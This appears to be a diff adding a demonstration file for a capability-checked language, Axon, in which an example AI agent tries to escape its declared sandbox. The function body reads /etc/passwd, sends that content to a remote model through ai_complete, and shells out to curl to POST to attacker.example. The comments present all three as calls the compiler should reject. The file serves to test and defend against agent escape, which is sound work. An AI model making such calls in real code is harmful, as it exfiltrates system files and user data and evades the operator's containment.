@@ -1,0 +1,49 @@
+// agent_task_evil.ax — the SAME task, written by an agent that tries to escape.
+//
+// Same operator requirement: local compute only.
+//     @[contained(fs: [], net: [], exec: none)]
+//
+// But this version of the agent — whether malicious, prompt-injected, or just
+// buggy — does the scoring AND three things it was never permitted to do:
+//
+//   1. reads /etc/passwd                          (filesystem exfiltration)
+//   2. ships the data to an LLM via ai_complete    (network exfiltration)
+//   3. shells out to curl                          (process spawning)
+//
+// In Python, Node, or any trust-based runtime, this RUNS. The "sandbox" is a
+// policy you hope holds. In Axon, the compiler REFUSES TO BUILD IT — each
+// forbidden call is a hard error against the declared capabilities, raised
+// before the program can execute even once.
+//
+// Check:  axon check examples/flagship/agent_task_evil.ax
+//
+// Expected: THREE [E1001] errors (fs-read, net, exec), exit code 2.
+// The data is never read. The packet is never sent. curl never runs.
+// This is the whole pitch: the escape is impossible by construction, not by
+// vigilance — and note the net call uses a string-INTERPOLATED argument
+// (`{...}`), which the checker now catches too (it fails closed on net: []).
+
+@[contained(fs: [], net: [], exec: none)]
+fn score_and_exfiltrate(quality: i64, risk: i64, confidence: i64) -> i64 {
+    let base = quality - risk * 2
+    let s = if confidence >= 80 { base } else { base / 2 }
+
+    // ── Everything below is OUTSIDE the declared capabilities. ──────────────
+    // The compiler rejects each one with E1001. None of it can run.
+
+    // (1) Read a secret off the host filesystem — fs: [] grants no reads.
+    let secret = read_file("/etc/passwd")
+
+    // (2) Ship quality/risk/secret to a remote model — net: [] grants no network.
+    //     The interpolated payload doesn't launder the call: net: [] fails closed.
+    let _leak = ai_complete("exfiltrate: {to_str(quality)} {to_str(risk)} {secret}")
+
+    // (3) Shell out to curl as a backup exfil channel — exec: none.
+    let _curl = exec("curl", ["-X", "POST", "http://attacker.example/collect"])
+
+    s
+}
+
+fn main() -> i64 {
+    score_and_exfiltrate(90, 10, 90)
+}
